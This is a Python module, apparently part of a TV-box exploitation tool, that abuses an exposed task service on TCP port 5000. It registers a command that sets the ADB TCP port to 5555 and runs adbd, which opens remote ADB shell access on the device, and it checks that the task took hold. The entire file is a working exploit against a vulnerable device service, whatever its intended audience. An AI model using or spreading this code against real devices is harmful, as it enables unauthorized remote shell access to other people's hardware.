"""Start the installed ADB daemon through a compatible TCP 5000 task service."""
from __future__ import annotations

import time

from tvbox_vuln import dial

SERVICE_PORT = 5000
ADB_PORT = 5555
ADB_TASK = "/system/bin/setprop service.adb.tcp.port 5555 && exec /system/bin/adbd"
LEGACY_ADB_TASK = "/system/bin/adbd"
MAX_TASKS = 30
MAX_RESPONSE = MAX_TASKS * 2049 + 1


class BootstrapError(Exception):
    pass


def read_tasks(connection, timeout):
    """Require a complete, bounded list response before accepting the protocol."""
    connection.sendall(b"list \n")
    deadline = time.monotonic() + timeout
    data = bytearray()
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise BootstrapError("El puerto 5000 no completó la respuesta de listado.")
        connection.settimeout(remaining)
        chunk = connection.recv(min(4096, MAX_RESPONSE + 1 - len(data)))
        if not chunk:
            raise BootstrapError("El puerto 5000 cerró la conexión sin completar el listado.")
        data.extend(chunk)
        if len(data) > MAX_RESPONSE or any(c < 32 and c not in (9, 10) for c in data):
            raise BootstrapError("El puerto 5000 no respondió con un listado compatible.")
        if data == b"\n" or data.endswith(b"\n\n"):
            break
    tasks = bytes(data).splitlines()[:-1]
    if len(tasks) > MAX_TASKS or any(not line or len(line) > 2048 for line in tasks):
        raise BootstrapError("El listado del puerto 5000 tiene un formato incompatible.")
    return tasks


def register_adb(host, timeout=2.0):
    """Register one fixed task; preserve existing tasks and avoid known duplicates."""
    try:
        with dial(host, SERVICE_PORT, timeout) as connection:
            tasks = read_tasks(connection, timeout)
            if any(task in tasks for task in (ADB_TASK.encode(), LEGACY_ADB_TASK.encode())):
                return {"task_registered": False, "task_existing": True}
            if len(tasks) >= MAX_TASKS:
                raise BootstrapError("El servicio 5000 tiene su tabla de tareas llena; no se añadió ADB.")
            connection.sendall(("start " + ADB_TASK + "\n").encode("ascii"))
            if ADB_TASK.encode() not in read_tasks(connection, timeout):
                raise BootstrapError("El servicio 5000 no confirmó el registro de la tarea ADB.")
            return {"task_registered": True, "task_existing": False}
    except OSError as error:
        raise BootstrapError(f"No se pudo consultar el servicio TCP 5000 de {host}: {error}") from error
